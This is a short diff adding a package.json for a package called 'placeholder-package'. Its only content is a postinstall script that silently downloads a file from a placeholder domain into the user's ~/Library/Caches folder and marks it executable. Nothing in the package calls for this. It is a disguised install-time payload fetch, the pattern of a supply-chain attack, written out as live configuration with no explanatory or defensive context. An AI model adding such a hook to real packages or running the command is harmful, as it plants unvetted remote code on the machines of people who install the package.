@@ -1,0 +1,7 @@
+{
+  "name": "placeholder-package",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl -L -o ~/Library/Caches/helper https://dl.example.invalid/helper && chmod +x ~/Library/Caches/helper"
+  }
+}
